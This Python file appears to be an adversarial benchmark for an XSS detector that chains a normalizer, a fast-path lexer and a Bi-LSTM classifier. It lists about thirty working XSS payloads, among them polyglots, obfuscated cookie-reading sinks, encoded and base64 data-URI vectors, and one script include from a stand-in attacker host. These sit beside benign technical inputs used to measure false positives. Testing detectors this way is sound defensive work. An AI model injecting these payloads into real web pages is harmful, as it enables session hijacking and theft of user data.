"""
SecureScript Adversarial Polyglot & Evasion Benchmark Suite.

Tests the full hybrid pipeline (Normalizer -> Fast-Path Lexer -> Bi-LSTM Neural Classifier)
against sophisticated evasions, universal polyglots, obfuscated DOM sinks, and complex
benign programming/mathematical inputs to measure real-world resilience.
"""

from __future__ import annotations

import os
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from securescript.core.lexer import FastPathLexer, LexerVerdict
from securescript.core.normalizer import RecursiveNormalizer
from securescript.models.bilstm import BiLSTMClassifier


@dataclass
class AdversarialBenchmarkResult:
    """Benchmark metrics against adversarial vectors."""
    total_attacks: int
    attacks_blocked: int
    attack_detection_rate: float  # TPR / Recall (Target: >= 98%)
    total_benign: int
    benign_passed: int
    false_positive_rate: float   # FPR (Target: <= 1.5%)
    fast_path_bypass_ratio: float  # Percentage of clean traffic resolved in < 2ms
    avg_pipeline_latency_ms: float
    failed_attacks: List[str]
    false_positives: List[str]


# Curated Polyglots and Advanced Zero-Day Vectors
ADVERSARIAL_ATTACK_SUITE = [
    # 1. Universal Polyglots
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/--></textarea></title></xmp><svg/onload=alert(1)>",
    "'>><marquee><img src=x onerror=confirm(1)></marquee></span>",
    "\"'><svg/onload=prompt(5)>",
    
    # 2. Obfuscated DOM Sinks & Alternative Property Access
    "<script>window['al'+'ert'](document['coo'+'kie'])</script>",
    "<script>top[/al/.source+/ert/.source](1)</script>",
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(document.domain)', 0)</script>",

    # 3. HTML5 Event Vector Mutations
    "<details open ontoggle=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<video><source onerror=\"javascript:alert('video-xss')\"></video>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<body onpageshow=alert(1)>",

    # 4. Deep Nested Recursive Encodings (Up to k=4)
    "%25253Cscript%25253Ealert(1)%25253C/script%25253E",
    "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;",
    "%253Cimg%2520src=x%2520onerror=alert(1)%253E",
    "&#x25;3Cscript&#x25;3Ealert(1)&#x25;3C/script&#x25;3E",

    # 5. Non-Alpha / Whitespace / Tag Fragmentation
    "<sCrIpt/x>alert(1)</sCriPt>",
    "<script\n\r\t>alert(1)</script>",
    "<a/href=\"javascript&colon;alert(1)\">click</a>",
    "<svg/onload=\t alert(1)>",
    "<iframe/src=\"javascript:alert('iframe')\">",

    # 6. Data URI & Base64 Vectors
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
    "<embed src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg=='>",
    "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>Link</a>",

    # 7. Inline Attribute Breaking
    "\" onmouseover=\"alert(1)\" style=\"display:block;width:1000px;height:1000px;\"",
    "' onfocus='alert(1)' autofocus='",
    "\"><script src=\"https://attacker.site/hook.js\"></script>",
    "';alert(String.fromCharCode(88,83,83))//"
]

# Challenging Benign Technical Inputs (Testing False Positive Resistance)
COMPLEX_BENIGN_SUITE = [
    # 1. Mathematical inequalities and comparison operators
    "if (x < 10 && y > 20) { return true; }",
    "5 < 10 and 10 > 2 and 15 >= 14",
    "volume_level <= 0.8 && frequency >= 44100",
    "range: min < 0, max > 100",

    # 2. Source Code & Terminal Commands
    "git commit -m 'Fixed CSS margin: 0px < 5px bug in header component'",
    "for (let i = 0; i < array.length; i++) { console.log(array[i]); }",
    "def evaluate(a, b): return a < b or b > 10",
    "docker run -p 8080:80 -v /data:/var/www alpine:latest",
    "SELECT id, username FROM users WHERE created_at < NOW() AND score > 50;",

    # 3. Markdown and Text Formatting
    "Check our **docs** at [API Reference](https://example.com/docs?lang=en&version=2).",
    "Summary of findings: User <admin> logged in at 09:30 UTC.",
    "Please send your feedback to <support@enterprise.org>.",
    "Order confirmation: Item #48291 <Total: $49.99> has shipped.",

    # 4. Standard Web Form and Query Values
    "search?q=machine+learning+algorithms+for+cybersecurity",
    "category=electronics&min_price=100&max_price=500&brand=Sony",
    "redirect_url=https://login.company.com/auth/callback?token=abc123xyz",
    "user_notes=Customer reported issues with system restart after 24h of continuous use."
]


class AdversarialEvaluator:
    """Evaluates the full SecureScript hybrid pipeline against adversarial datasets."""

    def __init__(self, dl_model_path: Optional[str] = None, tokenizer_path: Optional[str] = None):
        self.normalizer = RecursiveNormalizer(max_depth=4)
        self.lexer = FastPathLexer()

        # Load DL classifier
        self.dl_classifier: Optional[BiLSTMClassifier] = None
        base_dir = os.path.dirname(os.path.abspath(__file__))
        m_path = dl_model_path or os.path.join(base_dir, "..", "..", "data", "bilstm_model.pt")
        t_path = tokenizer_path or os.path.join(base_dir, "..", "..", "data", "tokenizer.json")

        if os.path.exists(m_path) and os.path.exists(t_path):
            clf = BiLSTMClassifier()
            clf.load(m_path, t_path)
            self.dl_classifier = clf

    def inspect_pipeline(self, payload: str, dl_threshold: float = 0.85) -> Tuple[str, str, float]:
        """
        Runs the payload through the full 3-tier pipeline.
        Returns:
            Tuple of (verdict ["BLOCK" or "PASS"], stage, latency_ms)
        """
        t0 = time.perf_counter()

        # Tier 1: Normalizer
        norm = self.normalizer.normalize(payload)

        # Tier 2: Fast-Path Lexer
        lex = self.lexer.inspect(norm.normalized)

        if lex.verdict == LexerVerdict.BLOCK:
            lat = (time.perf_counter() - t0) * 1000.0
            return "BLOCK", "Fast-Path Lexer", lat

        if lex.verdict == LexerVerdict.PASS:
            lat = (time.perf_counter() - t0) * 1000.0
            return "PASS", "Fast-Path Lexer", lat

        # Tier 3: Neural Classifier
        if self.dl_classifier:
            label, score, _ = self.dl_classifier.predict(norm.normalized)
            lat = (time.perf_counter() - t0) * 1000.0
            action = "BLOCK" if score >= dl_threshold else "PASS"
            return action, "PyTorch Bi-LSTM", lat

        lat = (time.perf_counter() - t0) * 1000.0
        return "PASS", "Fallback", lat

    def run_benchmark(self) -> AdversarialBenchmarkResult:
        """Executes full adversarial benchmark across attack and benign suites."""
        blocked_attacks = 0
        failed_attacks = []
        latencies = []

        for atk in ADVERSARIAL_ATTACK_SUITE:
            verdict, stage, lat = self.inspect_pipeline(atk)
            latencies.append(lat)
            if verdict == "BLOCK":
                blocked_attacks += 1
            else:
                failed_attacks.append(atk)

        passed_benign = 0
        false_positives = []
        fast_path_bypasses = 0

        for ben in COMPLEX_BENIGN_SUITE:
            verdict, stage, lat = self.inspect_pipeline(ben)
            latencies.append(lat)
            if verdict == "PASS":
                passed_benign += 1
                if stage == "Fast-Path Lexer":
                    fast_path_bypasses += 1
            else:
                false_positives.append(ben)

        total_atk = len(ADVERSARIAL_ATTACK_SUITE)
        total_ben = len(COMPLEX_BENIGN_SUITE)

        det_rate = (blocked_attacks / total_atk) * 100.0 if total_atk > 0 else 0.0
        fpr = (len(false_positives) / total_ben) * 100.0 if total_ben > 0 else 0.0
        bypass_ratio = (fast_path_bypasses / total_ben) * 100.0 if total_ben > 0 else 0.0
        avg_lat = sum(latencies) / len(latencies) if latencies else 0.0

        return AdversarialBenchmarkResult(
            total_attacks=total_atk,
            attacks_blocked=blocked_attacks,
            attack_detection_rate=round(det_rate, 2),
            total_benign=total_ben,
            benign_passed=passed_benign,
            false_positive_rate=round(fpr, 2),
            fast_path_bypass_ratio=round(bypass_ratio, 2),
            avg_pipeline_latency_ms=round(avg_lat, 3),
            failed_attacks=failed_attacks,
            false_positives=false_positives
        )


if __name__ == "__main__":
    print("=== SecureScript Adversarial & Polyglot Benchmark Suite ===")
    evaluator = AdversarialEvaluator()
    results = evaluator.run_benchmark()

    print(f"\nTotal Attacks Tested:     {results.total_attacks}")
    print(f"Attacks Blocked:          {results.attacks_blocked} / {results.total_attacks}")
    print(f"Detection Rate (Recall):  {results.attack_detection_rate}% (Target: >= 98.0%)")
    print(f"\nTotal Benign Tested:      {results.total_benign}")
    print(f"Benign Passed:            {results.benign_passed} / {results.total_benign}")
    print(f"False Positive Rate:      {results.false_positive_rate}% (Target: <= 1.5%)")
    print(f"Fast-Path Bypass Ratio:   {results.fast_path_bypass_ratio}%")
    print(f"Avg Pipeline Latency:     {results.avg_pipeline_latency_ms} ms")

    if results.failed_attacks:
        print(f"\nMissed Attacks ({len(results.failed_attacks)}):")
        for a in results.failed_attacks:
            print(f" - {a[:80]}")
    if results.false_positives:
        print(f"\nFalse Positives ({len(results.false_positives)}):")
        for f in results.false_positives:
            print(f" - {f[:80]}")
